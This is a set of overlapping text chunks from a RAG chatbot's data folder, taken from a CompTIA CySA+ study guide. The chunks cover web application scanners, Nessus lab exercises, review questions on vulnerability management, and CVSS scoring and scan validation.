rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	the exploits available in Pacu Web Application Scanning Web application scanners are specialized tools used to examine the security of web applications. These tools test for web-­specific vulnerabilities, such as SQL injection, cross-­site scripting (XSS), and cross-­site request forgery (CSRF) vulnerabilities. They work by combining traditional network scans of web servers with detailed probing of web applications using such techniques as sending known malicious input sequences and fuzzing in attempts to break the application. You’ll learn more about fuzzing in Chapter 8, “Responding to Vulnerabilities.” Nikto is one of the two open source web application scanning tools that are required knowledge for the CySA+ exam. As an open source tool, it is freely available for anyone to use. As shown in Figure 6.22, Nikto uses a command-­line interface and is somewhat difficult to use. 234 Chapter 6 ■ Designing a Vulnerability Management Program FIGURE 6.21 Partial results of a Prowler scan against an AWS account FIGURE 6.22 Nikto web application scanner Vulnerability Assessment Tools 235 The other open source tool available for web application scanning is Arachni. This tool, shown in Figure 6.23, is a packaged scanner available for Windows, macOS, and Linux operating systems. FIGURE 6.23 Arachni web application scanner Most organizations use web application scanners, but they choose to use commercial products that offer advanced capabilities and user-­friendly interfaces. Although there are dedicated web application scanners on the market, many firms use the web application scanning capabilities of traditional network vulnerability scanners, such as Nessus, Qualys, and Nexpose. Figure 6.24 shows an example of Nessus used in a web scanning role. Interception Proxies Interception proxies are valuable tools for penetration testers and others seeking to evaluate the security of web applications. As such, they can be classified as exploit tools. They run on the tester’s system and intercept requests being sent from the web browser to the web server before they are released onto the network. This allows the tester to manually manipulate the request to attempt the injection of an attack. Figure 6.25 shows the popular open source Zed Attack Proxy (ZAP). ZAP is a community development project coordinated by the Open Web Application Security Project (OWASP). Users of ZAP can intercept requests sent from any web browser and alter them before passing them to the web server. 236 Chapter 6 ■ Designing a Vulnerability Management Program FIGURE 6.24 Nessus web application scanner FIGURE 6.25 Zed Attack Proxy (ZAP) Vulnerability Assessment Tools 237 The Burp Proxy, shown in Figure 6.26, is another option available to cybersecurity analysts seeking an interception proxy. It is part of a commercial web application security toolkit called the Burp Suite from PortSwigger. While the full Burp Suite requires a paid license, Burp Proxy is currently available as part of a free edition of the product. FIGURE 6.26 Burp Proxy Exam Note Practice with the vulnerability and web application scanners discussed in this chapter. The exam expects you to be able to analyze output and identify issues using these assessment tools! 238 Chapter
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	Proxy (ZAP) Vulnerability Assessment Tools 237 The Burp Proxy, shown in Figure 6.26, is another option available to cybersecurity analysts seeking an interception proxy. It is part of a commercial web application security toolkit called the Burp Suite from PortSwigger. While the full Burp Suite requires a paid license, Burp Proxy is currently available as part of a free edition of the product. FIGURE 6.26 Burp Proxy Exam Note Practice with the vulnerability and web application scanners discussed in this chapter. The exam expects you to be able to analyze output and identify issues using these assessment tools! 238 Chapter 6 ■ Designing a Vulnerability Management Program Summary Vulnerability management programs allow cybersecurity professionals to identify and remediate gaps in the security of systems, applications, and devices under their control. Organizations that operate in highly regulated environments may be required to conduct vulnerability scanning by law or regulation, but many organizations outside those industries implement vulnerability management programs as a security best practice. Cybersecurity analysts building a vulnerability management program should begin by identifying the scan requirements. This includes a review of possible scan targets and the selection of scan frequencies. Once these early decisions are made, analysts may configure and execute vulnerability scans on a regular basis, preferably through the use of automated scan scheduling systems. Each vulnerability detected during a scan should be fed into a vulnerability remediation workflow that assigns tasks to the appropriate engineers, tracks completion of remediation effort, and follows up remediation work with a final vulnerability scan. Working through the initial scan results may be an overwhelming task. Organizations should prioritize remediation work based on the criticality of the systems and information affected by the vulnerability, the difficulty of remediation, the severity of the vulnerability, and the exposure of the vulnerability to outside networks. As an organization cleans up its initial scan results, it may move on to an ongoing scanning approach that embraces continuous monitoring to quickly identify new vulnerabilities. In Chapter 7, “Analyzing Vulnerability Scans,” you’ll learn more about how to analyze the results of vulnerability scans. Exam Essentials Know that requirements for vulnerability scanning may come from both internal and external sources. In some cases, organizations may face legal and regulatory requirements to conduct vulnerability scanning. The Payment Card Industry Data Security Standard (PCI DSS) and the Federal Information Security Management Act (FISMA) are two examples of these external requirements. In other cases, scanning may be driven by internal requirements, such as organizational policy. Know the criteria for selecting scan targets. Discovery scans provide organizations with an automated way to identify hosts that exist on the network and build an asset inventory. Cybersecurity professionals may then select scan targets based on data classification, system exposure, services offered, and the status of the system as a test, development, or production environment. Describe how scan frequency will vary based on the needs of the organization. Administrators may choose to run scans on a daily, weekly, or monthly basis depending on the organization’s risk
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	other cases, scanning may be driven by internal requirements, such as organizational policy. Know the criteria for selecting scan targets. Discovery scans provide organizations with an automated way to identify hosts that exist on the network and build an asset inventory. Cybersecurity professionals may then select scan targets based on data classification, system exposure, services offered, and the status of the system as a test, development, or production environment. Describe how scan frequency will vary based on the needs of the organization. Administrators may choose to run scans on a daily, weekly, or monthly basis depending on the organization’s risk appetite, regulatory requirements, licensing limitations, and business Lab Exercises 239 and technical constraints. Some organizations may choose to adopt continuous monitoring approaches to vulnerability detection. Explain how configuring scan settings allows customization to meet the organization’s security requirements. Cybersecurity professionals may customize scans by configuring the sensitivity level, including and excluding plug-­ins, and supplementing basic network scans with information gathered from credentialed scans and server-­based agents. Security teams may also conduct scans from more than one scan perspective, providing different views of the network. Name the tasks administrators who are responsible for maintaining vulnerability scanning systems should perform. Administrators responsible for maintaining vulnerability scanning systems should perform two important administrative tasks. First, they should update the scanner software on a regular basis to correct security issues and add new functionality. Second, they should update plug-­ins frequently to provide the most accurate and up-­to-­date vulnerability scans of their environment. Describe the remediation workflow organizations should use to identify, remediate, and test vulnerabilities. Remediation workflows should be as automated as possible and integrate with other workflow technology used by the IT organization. As technologists correct vulnerabilities, they should validate that the remediation was effective through security testing and close out the vulnerability in the tracking system. The vulnerability management system should provide a range of reporting and alerting tools to supplement these efforts. Know that cybersecurity professionals should prioritize remediation activities to make effective use of limited resources. It simply isn’t possible to correct every vulnerability immediately. Security teams should prioritize their work based on the criticality of the systems and information affected by the vulnerability, the difficulty of remediating the vulnerability, the severity of the vulnerability, and the exposure of the affected system. Know how cybersecurity professionals must prepare to overcome objections to scanning from other members of the IT team. Common objections to vulnerability scanning include the effect that service degradation caused by scanning will have on IT services, commitments to customers in MOUs and SLAs, and the use of IT governance and change management processes. Lab Exercises Activity 6.1: Install a Vulnerability Scanner In this lab, you will install the Nessus vulnerability management package on a system. This lab requires access to a Linux system that you can use to install Nessus (preferably Ubuntu, Debian, Red Hat, SUSE, or Fedora). 240 Chapter 6 ■ Designing a Vulnerability Management Program Part 1: Obtain a Nessus Essentials activation code 1. Visit
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	Common objections to vulnerability scanning include the effect that service degradation caused by scanning will have on IT services, commitments to customers in MOUs and SLAs, and the use of IT governance and change management processes. Lab Exercises Activity 6.1: Install a Vulnerability Scanner In this lab, you will install the Nessus vulnerability management package on a system. This lab requires access to a Linux system that you can use to install Nessus (preferably Ubuntu, Debian, Red Hat, SUSE, or Fedora). 240 Chapter 6 ■ Designing a Vulnerability Management Program Part 1: Obtain a Nessus Essentials activation code 1. Visit the Nessus website (www.tenable.com/products/nessus/ nessus-­essentials) and fill out the form to obtain an activation code. 2. Save the email containing the code for use during the installation and activation process. Part 2: Download Nessus and install it on your system 1. 2. Visit the Nessus download page (www.tenable.com/downloads/nessus) and download the appropriate version of Nessus for your system. Install Nessus following the documentation available at https://docs.tenable .com/Nessus.htm. 3. Verify that your installation was successful by logging into your Nessus server. Activity 6.2: Run a Vulnerability Scan In this lab, you will run a vulnerability scan against a server of your choice. It is important to note that you should never run a vulnerability scan without permission. You will need access to both your vulnerability scanning server that you built in Activity 6.1 and a target server for your scan. If you do not have a server that you currently have permission to scan, you may build one using a cloud service provider, such as Amazon Web Services (AWS), Microsoft Azure, or Google Compute Platform. Conduct a vulnerability scan against your server and save the resulting report. If you need assistance, consult the Nessus documentation. You will need the report from this vulnerability scan to complete the activities in the next chapter. Review Questions 241 Review Questions 1. 2. 3. 4. 5. 6. What federal law requires the use of vulnerability scanning on information systems operated by federal government agencies? A. HIPAA B. GLBA C. FISMA D. FERPA Which one of the following industry standards describes a standard approach for setting up an information security management system? A. OWASP B. CIS C. ISO 27002 D. ISO 27001 What tool can administrators use to help identify the systems present on a network prior to conducting vulnerability scans? A. Asset inventory B. Web application assessment C. Router D. DLP Tonya is configuring vulnerability scans for a system that is subject to the PCI DSS compliance standard. What is the minimum frequency with which she must conduct scans? A. Daily B. Weekly C. Monthly D. Quarterly Which one of the following is not an example of a vulnerability scanning tool? A. Nikto B. Snort C. Nessus D. OpenVAS Bethany is the vulnerability management specialist for a large retail organization. She completed her last PCI DSS compliance scan in March. In April, the organization upgraded their point-­of-­sale system, and Bethany is preparing to conduct new
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	application assessment C. Router D. DLP Tonya is configuring vulnerability scans for a system that is subject to the PCI DSS compliance standard. What is the minimum frequency with which she must conduct scans? A. Daily B. Weekly C. Monthly D. Quarterly Which one of the following is not an example of a vulnerability scanning tool? A. Nikto B. Snort C. Nessus D. OpenVAS Bethany is the vulnerability management specialist for a large retail organization. She completed her last PCI DSS compliance scan in March. In April, the organization upgraded their point-­of-­sale system, and Bethany is preparing to conduct new scans. When must she complete the new scan? A. Immediately. B. June. C. December. D. No scans are required. Chapter 6 242 7. 8. 9. ■ Designing a Vulnerability Management Program Renee is configuring her vulnerability management solution to perform credentialed scans of servers on her network. What type of account should she provide to the scanner? A. Domain administrator B. Local administrator C. Root D. Read-­only Jason is writing a report about a potential security vulnerability in a software product and wishes to use standardized product names to ensure that other security analysts understand the report. Which SCAP component can Jason turn to for assistance? A. CVSS B. CVE C. CPE D. OVAL Bill would like to run an internal vulnerability scan on a system for PCI DSS compliance purposes. Who is authorized to complete one of these scans? A. Any employee of the organization B. An approved scanning vendor C. A PCI DSS service provider D. Any qualified individual 10. Which type of organization is the most likely to face a regulatory requirement to conduct vulnerability scans? A. Bank B. Hospital C. Government agency D. Doctor’s office 11. Which one of the following organizations focuses on providing tools and advice for secure web application development? A. OWASP B. CIS C. NIST D. Microsoft 12. What term describes an organization’s willingness to tolerate risk in their computing environment? A. Risk landscape B. Risk appetite C. Risk level D. Risk adaptation Review Questions 243 13. Which one of the following factors is least likely to impact vulnerability scanning schedules? A. Regulatory requirements B. Technical constraints C. Business constraints D. Staff availability 14. Barry placed all of his organization’s credit card processing systems on an isolated network dedicated to card processing. He has implemented appropriate segmentation controls to limit the scope of PCI DSS to those systems through the use of VLANs and firewalls. When Barry goes to conduct vulnerability scans for PCI DSS compliance purposes, what systems must he scan? A. Customer systems B. Systems on the isolated network C. Systems on the general enterprise network D. Both B and C 15. Ryan is planning to conduct a vulnerability scan of a business-­critical system using dangerous plug-­ins. What would be the best approach for the initial scan? A. Run the scan against production systems to achieve the most realistic results possible. B. Run the scan during business hours. C. Run
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	of PCI DSS to those systems through the use of VLANs and firewalls. When Barry goes to conduct vulnerability scans for PCI DSS compliance purposes, what systems must he scan? A. Customer systems B. Systems on the isolated network C. Systems on the general enterprise network D. Both B and C 15. Ryan is planning to conduct a vulnerability scan of a business-­critical system using dangerous plug-­ins. What would be the best approach for the initial scan? A. Run the scan against production systems to achieve the most realistic results possible. B. Run the scan during business hours. C. Run the scan in a test environment. D. Do not run the scan to avoid disrupting the business. 16. Which one of the following activities is not part of the vulnerability management life cycle? A. Detection B. Remediation C. Reporting D. Testing 17. What approach to vulnerability scanning incorporates information from agents running on the target servers? A. Continuous monitoring B. Ongoing scanning C. On-­demand scanning D. Alerting 18. Kolin would like to use an automated web application vulnerability scanner to identify any potential security issues in an application that is about to be deployed in his environment. Which one of the following tools is least likely to meet his needs? A. ZAP B. Nikto C. Arachni D. Burp Suite Chapter 6 244 ■ Designing a Vulnerability Management Program 19. Jessica is reading reports from vulnerability scans run by different part of her organization using different products. She is responsible for assigning remediation resources and is having difficulty prioritizing issues from different sources. What SCAP component can help Jessica with this task? A. CVSS B. CVE C. CPE D. XCCDF 20. Sarah would like to run an external vulnerability scan on a system for PCI DSS compliance purposes. Who is authorized to complete one of these scans? A. Any employee of the organization B. An approved scanning vendor C. A PCI DSS service provider D. Any qualified individual Chapter 7 Analyzing Vulnerability Scans THE COMPTIA CYBERSECURITY ANALYST (CYSA+) EXAM OBJECTIVES COVERED IN THIS CHAPTER INCLUDE: ✓✓ Domain 2.0: Vulnerability Management ■■ 2.1 Given a scenario, implement vulnerability scanning methods and concepts ■■ ■■ Critical infrastructure 2.3 Given a scenario, analyze data to prioritize vulnerabilities ■■ Common Vulnerability Scoring System (CVSS) interpretation ■■ ■■ Validation ■■ Context awareness ■■ Exploitability/weaponization ■■ Asset value ■■ Zero-­day 2.4 Given a scenario, recommend controls to mitigate attacks and software vulnerabilities ■■ Cross-­site scripting ■■ Overflow vulnerabilities ■■ Data poisoning ■■ Broken access control ■■ Cryptographic failures ■■ Injection flaws ■■ Cross-­site request forgery ■■ Directory traversal ■■ Insecure design ■■ Security misconfiguration ■■ End-­of-­life or outdated components ■■ Identification and authentication failures ■■ Server-­side request forgery ■■ Remote code execution ■■ Privilege escalation ■■ Local file inclusion (LFI)/remote file inclusion (RFI) Cybersecurity analysts spend a significant amount of time analyzing and interpreting the reports generated by vulnerability scanners. Although scanners are extremely effective at automating the manual work of vulnerability identification, the results that they
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	mitigate attacks and software vulnerabilities ■■ Cross-­site scripting ■■ Overflow vulnerabilities ■■ Data poisoning ■■ Broken access control ■■ Cryptographic failures ■■ Injection flaws ■■ Cross-­site request forgery ■■ Directory traversal ■■ Insecure design ■■ Security misconfiguration ■■ End-­of-­life or outdated components ■■ Identification and authentication failures ■■ Server-­side request forgery ■■ Remote code execution ■■ Privilege escalation ■■ Local file inclusion (LFI)/remote file inclusion (RFI) Cybersecurity analysts spend a significant amount of time analyzing and interpreting the reports generated by vulnerability scanners. Although scanners are extremely effective at automating the manual work of vulnerability identification, the results that they generate require interpretation by a trained analyst to eliminate false positive reports, prioritize remediation activities, and delve into the root causes of vulnerability reports. In this chapter, you will learn how cybersecurity analysts apply their knowledge and experience to the review of vulnerability scan reports. Reviewing and Interpreting Scan Reports Vulnerability scan reports provide analysts with a significant amount of information that assists with the interpretation of the report. In addition to the high-­level report examples shown in Chapter 6, “Designing a Vulnerability Management Program,” vulnerability scanners provide detailed information about each vulnerability that they identify. Figure 7.1 shows an example of a single vulnerability reported by the Nessus vulnerability scanner. Let’s take a look at this report, section by section, beginning in the top left and proceeding in a counterclockwise fashion. At the very top of the report, we see two critical details: the name of the vulnerability, which offers a descriptive title, and the overall severity of the vulnerability, expressed as a general category, such as low, medium, high, or critical. In this example report, the scanner is reporting that a server is running an outdated and insecure version of the SSL protocol. It is assigned to the high severity category. Next, the report provides a detailed description of the vulnerability. In this case, the report provides a detailed description of the flaws in the SSL protocol and explains that SSL is no longer considered acceptable for use. The next section of the report provides a solution to the vulnerability. When possible, the scanner offers detailed information about how system administrators, security professionals, network engineers, and/or application developers may correct the vulnerability. In this case, the reader is instructed to disable SSL 2.0 and 3.0 and replace their use with a secure version of the TLS protocol. In the section of the report titled “See Also,” the scanner provides references where administrators can find more details on the vulnerability described in the report. In this case, the scanner refers the reader to several blog posts, Nessus documentation pages, and Internet Engineering Task Force (IETF) documents that provide more details on the vulnerability. 248 Chapter 7 F I G U R E 7. 1 ■ Analyzing Vulnerability Scans Nessus vulnerability scan report The output section of the report shows the detailed information returned by the remote system when probed for the vulnerability. This information can be extremely valuable to
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	the section of the report titled “See Also,” the scanner provides references where administrators can find more details on the vulnerability described in the report. In this case, the scanner refers the reader to several blog posts, Nessus documentation pages, and Internet Engineering Task Force (IETF) documents that provide more details on the vulnerability. 248 Chapter 7 F I G U R E 7. 1 ■ Analyzing Vulnerability Scans Nessus vulnerability scan report The output section of the report shows the detailed information returned by the remote system when probed for the vulnerability. This information can be extremely valuable to an analyst because it often provides the verbatim output returned by a command. Analysts can use this to better understand why the scanner is reporting a vulnerability, to identify the location of a vulnerability, and potentially to identify false positive reports. In this case, the output section shows the specific insecure ciphers being used. The port/hosts section provides details on the server(s) that contain the vulnerability as well as the specific services on that server that have the vulnerability. In this case, the server’s Reviewing and Interpreting Scan Reports 249 IP address is obscured for privacy reasons, but we can see that the server is running insecure versions of SSL on both ports 443 and 4433. The vulnerability information section provides some miscellaneous information about the vulnerability. In this case, we see that the SSL vulnerability has appeared in news reports. The risk information section includes useful information for assessing the severity of the vulnerability. In this case, the scanner reports that the vulnerability has an overall risk factor of High (consistent with the tag next to the vulnerability title). It also provides details on how the vulnerability rates when using the Common Vulnerability Scoring System (CVSS). You’ll notice that there are two different CVSS scores and vectors. We will use the CVSS version 3 information, since it is the more recent rating scale. In this case, the vulnerability has a CVSS base score of 7.5 and has the CVSS vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N We’ll discuss the details of CVSS scoring in the next section of this chapter. The final section of the vulnerability report provides details on the vulnerability scanner plug-­in that detected the issue. This vulnerability was reported by Nessus plug-­in ID 20007, which was published in October 2005 and updated in March 2019. Although this chapter focuses on interpreting the details of a Nessus vulnerability scan, the process is extremely similar for other vulnerability scanners. The format of the reports generated by different products may vary, but they generally contain the same information. For example, Figure 7.2 shows the output of a Qualys vulnerability report. F I G U R E 7. 2 Qualys vulnerability scan report 250 Chapter 7 ■ Analyzing Vulnerability Scans Understanding CVSS The Common Vulnerability Scoring System (CVSS) is an industry standard for assessing the severity of security vulnerabilities. It provides a technique for scoring each vulnerability on a variety of measures. Cybersecurity analysts often
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	the details of a Nessus vulnerability scan, the process is extremely similar for other vulnerability scanners. The format of the reports generated by different products may vary, but they generally contain the same information. For example, Figure 7.2 shows the output of a Qualys vulnerability report. F I G U R E 7. 2 Qualys vulnerability scan report 250 Chapter 7 ■ Analyzing Vulnerability Scans Understanding CVSS The Common Vulnerability Scoring System (CVSS) is an industry standard for assessing the severity of security vulnerabilities. It provides a technique for scoring each vulnerability on a variety of measures. Cybersecurity analysts often use CVSS ratings to prioritize response actions. Analysts scoring a new vulnerability begin by rating the vulnerability on eight different measures. Each measure is given both a descriptive rating and a numeric score. The first four measures evaluate the exploitability of the vulnerability, whereas the last three evaluate the impact of the vulnerability. The eighth metric discusses the scope of the vulnerability. Exam Note CVSS is a publicly available framework that provides a score from 0 to 10 indicating the severity of a vulnerability. Be sure you can interpret the various CVSS metrics described in this section. These include the Attack Vector, Attack Complexity, Privileges Required, User Interaction, Scope, and Impact (Confidentiality, Integrity, and Availability) metrics. Attack Vector Metric The attack vector (AV) metric describes how an attacker would exploit the vulnerability and is assigned according to the criteria shown in Table 7.1. TA B L E 7. 1 CVSS attack vector metric Value Description Score Physical (P) The attacker must physically touch the vulnerable device. 0.20 Local (L) The attacker must have physical or logical access to the affected system. 0.55 Adjacent Network (A) The attacker must have access to the local network that the affected system is connected to. 0.62 Network (N) The attacker can exploit the vulnerability remotely over a network. 0.85 Attack Complexity Metric The attack complexity (AC) metric describes the difficulty of exploiting the vulnerability and is assigned according to the criteria shown in Table 7.2. Reviewing and Interpreting Scan Reports TA B L E 7. 2 251 CVSS attack complexity metric Value Description Score High (H) Exploiting the vulnerability requires “specialized” conditions that would be difficult to find. 0.44 Low (L) Exploiting the vulnerability does not require any specialized conditions. 0.77 Privileges Required Metric The privileges required (PR) metric describes the type of account access that an attacker would need to exploit a vulnerability and is assigned according to the criteria in Table 7.3. TA B L E 7. 3 CVSS privileges required metric Value Description Score High (H) Attackers require administrative privileges to conduct the attack. 0.27 (or 0.50 if Scope is Changed) Low (L) Attackers require basic user privileges to conduct the attack. 0.62 (or 0.68 if Scope is Changed) None (N) Attackers do not need to authenticate to exploit the vulnerability. 0.85 User Interaction Metric The user interaction (UI) metric describes whether the attacker needs to involve another human in the
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	access that an attacker would need to exploit a vulnerability and is assigned according to the criteria in Table 7.3. TA B L E 7. 3 CVSS privileges required metric Value Description Score High (H) Attackers require administrative privileges to conduct the attack. 0.27 (or 0.50 if Scope is Changed) Low (L) Attackers require basic user privileges to conduct the attack. 0.62 (or 0.68 if Scope is Changed) None (N) Attackers do not need to authenticate to exploit the vulnerability. 0.85 User Interaction Metric The user interaction (UI) metric describes whether the attacker needs to involve another human in the attack. The user interaction metric is assigned according to the criteria in Table 7.4. TA B L E 7. 4 CVSS user interaction metric Value Description Score None (N) Successful exploitation does not require action by any user other than the attacker. 0.85 Required (R) Successful exploitation does require action by a user other than the attacker. 0.62 252 Chapter 7 ■ Analyzing Vulnerability Scans Confidentiality Metric The confidentiality metric describes the type of information disclosure that might occur if an attacker successfully exploits the vulnerability. The confidentiality metric is assigned according to the criteria in Table 7.5. TA B L E 7. 5 CVSS confidentiality metric Value Description Score None (N) There is no confidentiality impact. 0.00 Low (L) Access to some information is possible, but the attacker does not have control over what information is compromised. 0.22 High (H) All information on the system is compromised. 0.56 Integrity Metric The integrity metric describes the type of information alteration that might occur if an attacker successfully exploits the vulnerability. The integrity metric is assigned according to the criteria in Table 7.6. TA B L E 7. 6 CVSS integrity metric Value Description Score None (N) There is no integrity impact. 0.00 Low (L) Modification of some information is possible, but the attacker does not have control over what information is modified. 0.22 High (H) 0.56 The integrity of the system is totally compromised, and the attacker may change any information at will. Availability Metric The availability metric describes the type of disruption that might occur if an attacker successfully exploits the vulnerability. The availability metric is assigned according to the criteria in Table 7.7. Reviewing and Interpreting Scan Reports TA B L E 7. 7 253 CVSS availability metric Value Description Score None (N) There is no availability impact. 0.00 Low (L) The performance of the system is degraded. 0.22 High (H) The system is completely shut down. 0.56 Scope Metric The scope metric describes whether the vulnerability can affect system components beyond the scope of the vulnerability. The scope metric is assigned according to the criteria in Table 7.8. Note that the scope metric table does not contain score information. The value of the scope metric is reflected in the values for the privileges required metric, shown earlier in Table 7.3. TA B L E 7. 8 CVSS scope metric Value Description Unchanged (U) The exploited vulnerability can
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	0.00 Low (L) The performance of the system is degraded. 0.22 High (H) The system is completely shut down. 0.56 Scope Metric The scope metric describes whether the vulnerability can affect system components beyond the scope of the vulnerability. The scope metric is assigned according to the criteria in Table 7.8. Note that the scope metric table does not contain score information. The value of the scope metric is reflected in the values for the privileges required metric, shown earlier in Table 7.3. TA B L E 7. 8 CVSS scope metric Value Description Unchanged (U) The exploited vulnerability can only affect resources managed by the same security authority. Changed (C) The exploited vulnerability can affect resources beyond the scope of the security authority managing the component containing the vulnerability. Interpreting the CVSS Vector The CVSS vector uses a single-­line format to convey the ratings of a vulnerability on all of the metrics described in the preceding sections. For example, recall the CVSS vector presented in Figure 7.1: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N This vector contains nine components. The first section, CVSS:3.1, simply informs the reader (human or system) that the vector was composed using CVSS version 3.1. The next eight sections correspond to each of the eight CVSS metrics. In this case, the SSL vulnerability in Figure 7.1 received the following ratings: Attack Vector: Network (score: 0.85) Attack Complexity: Low (score: 0.77) Privileges Required: None (score: 0.85) User Interaction: None (score: 0.85) 254 Chapter 7 Analyzing Vulnerability Scans ■ Scope: Unchanged Confidentiality: High (score: 0.56) Integrity: None (score: 0.00) Availability: None (score: 0.00) Summarizing CVSS Scores The CVSS vector provides good detailed information on the nature of the risk posed by a vulnerability, but the complexity of the vector makes it difficult to use in prioritization exercises. For this reason, analysts can calculate the CVSS base score, which is a single number representing the overall risk posed by the vulnerability. Arriving at the base score requires first calculating the exploitability score, impact score, and impact function. Calculating the Impact Sub-­Score (ISS) The first calculation analysts perform is computing the impact sub-­score (ISS). This metric summarizes the three impact metrics using the formula: ISS 1 – 1 – Confidentiality 1 – Integrity 1 – Availability Plugging in the values for our SSL vulnerability, we obtain: ISS 1 – 1 – 0.56 1 – 0.00 1 – 0.00 ISS 1 – 0.44 1.00 1.00 ISS 1 – 0.44 ISS 0.56 Calculating the Impact Score To obtain the impact score from the impact sub-­score, we must take the value of the scope metric into account. If the scope metric is Unchanged, as it is in our example, we multiply the ISS by 6.42: Impact 6.42 * ISS Impact 6.42 *0.56 Impact 3.60 If the scope metric is Changed, we use a more complex formula: Impact 7.52 ISS – 0.029 – 3.25 ISS – 0.02 15 Reviewing and Interpreting Scan Reports 255 Calculating the Exploitability Score Exploitability is a measure of how likely it is that an
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	1 – 0.44 ISS 0.56 Calculating the Impact Score To obtain the impact score from the impact sub-­score, we must take the value of the scope metric into account. If the scope metric is Unchanged, as it is in our example, we multiply the ISS by 6.42: Impact 6.42 * ISS Impact 6.42 *0.56 Impact 3.60 If the scope metric is Changed, we use a more complex formula: Impact 7.52 ISS – 0.029 – 3.25 ISS – 0.02 15 Reviewing and Interpreting Scan Reports 255 Calculating the Exploitability Score Exploitability is a measure of how likely it is that an attacker will be able to actually use a vulnerability to gain access to a system. It is also often discussed as weaponization—­the ability of an attacker to develop an exploit that leverages a specific vulnerability. Analysts may calculate the exploitability score for a vulnerability using this formula: Exploitability 8.22 AttackVector AttackComplexity PrivilegesRequired UserInteraction Plugging in values for our SSL vulnerability, we get Exploitability Exploitability 8.22 0.85 0.77 0.85 0.85 3.89 Calculating the Base Score With all of this information at hand, we can now determine the CVSS base score using the following rules: If the impact is 0, the base score is 0. If the scope metric is Unchanged, calculate the base score by adding together the impact and exploitability scores. If the scope metric is Changed, calculate the base score by adding together the impact and exploitability scores and multiplying the result by 1.08. The highest possible base score is 10. If the calculated value is greater than 10, set the base score to 10. In our example, the impact score is 3.60 and the exploitability score rounds to 3.9. Adding these together, we get a base score of 7.5, which is the same value found in Figure 7.1. Now that you understand the math behind CVSS scores, the good news is that you don’t need to perform these calculations by hand. NIST offers a CVSS calculator at http://nvd.nist.gov/vuln-­metrics/cvss/ v3-­calculator, where you can easily compute the CVSS base score for a vulnerability. Categorizing CVSS Base Scores Many vulnerability scanning systems further summarize CVSS results by using risk categories rather than numeric risk ratings. These are usually based on the CVSS Qualitative Severity Rating Scale, shown in Table 7.9. Continuing with the SSL vulnerability example from Figure 7.1, we calculated the CVSS score for this vulnerability as 7.5. This places it into the High risk category, as shown in the header of Figure 7.1. 256 Chapter 7 TA B L E 7. 9 ■ Analyzing Vulnerability Scans CVSS Qualitative Severity Rating Scale CVSS Score Rating 0.0 None 0.1–3.9 Low 4.0–6.9 Medium 7.0–8.9 High 9.0–10.0 Critical To learn more about CVSS, visit www.first.org/cvss/ specification-­document. Validating Scan Results Cybersecurity analysts interpreting reports often perform their own investigations to confirm the presence and severity of vulnerabilities. These investigations may include the use of external data sources that supply additional information valuable to the analysis. False Positives Vulnerability scanners are useful tools, but they
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	it into the High risk category, as shown in the header of Figure 7.1. 256 Chapter 7 TA B L E 7. 9 ■ Analyzing Vulnerability Scans CVSS Qualitative Severity Rating Scale CVSS Score Rating 0.0 None 0.1–3.9 Low 4.0–6.9 Medium 7.0–8.9 High 9.0–10.0 Critical To learn more about CVSS, visit www.first.org/cvss/ specification-­document. Validating Scan Results Cybersecurity analysts interpreting reports often perform their own investigations to confirm the presence and severity of vulnerabilities. These investigations may include the use of external data sources that supply additional information valuable to the analysis. False Positives Vulnerability scanners are useful tools, but they aren’t foolproof. Scanners do sometimes make mistakes for a variety of reasons. The scanner might not have sufficient access to the target system to confirm a vulnerability, or it might simply have an error in a plug-­in that generates an erroneous vulnerability report. When a scanner reports a vulnerability that does not exist, this is known as a false positive error. When a vulnerability scanner reports a vulnerability, this is known as a positive report. This report may either be accurate (a true positive report) or inaccurate (a false positive report). Similarly, when a scanner reports that a vulnerability is not present, this is a negative report. The negative report may either be accurate (a true negative report) or inaccurate (a false negative report). Exam Note One of the CySA+ exam objectives requires that you be able to validate scan results. Be certain that you understand the four different possible results when validating reports. Each reported vulnerability is one of four things: a true positive, a false positive, a true negative, or a false negative. Validating Scan Results 257 Cybersecurity analysts should confirm each vulnerability reported by a scanner. In some cases, this may be as simple as verifying that a patch is missing or an operating system is outdated. In other cases, verifying a vulnerability requires a complex manual process that simulates an exploit. For example, verifying a SQL injection vulnerability may require actually attempting an attack against a web application and verifying the result in the backend database. When verifying a vulnerability, analysts should draw on their own expertise as well as the subject matter expertise of others throughout the organization. Database administrators, system engineers, network technicians, software developers, and other experts have domain knowledge that is essential to the evaluation of a potential false positive report. Documented Exceptions In some cases, an organization may decide not to remediate a vulnerability for one reason or another. For example, the organization may decide that business requirements dictate the use of an operating system that is no longer supported. Similarly, development managers may decide that the cost of remediating a vulnerability in a web application that is exposed only to the internal network outweighs the security benefit. Unless analysts take some action to record these exceptions, vulnerability scans will continue to report them each time a scan runs. It’s good practice to document exceptions in the vulnerability management system so
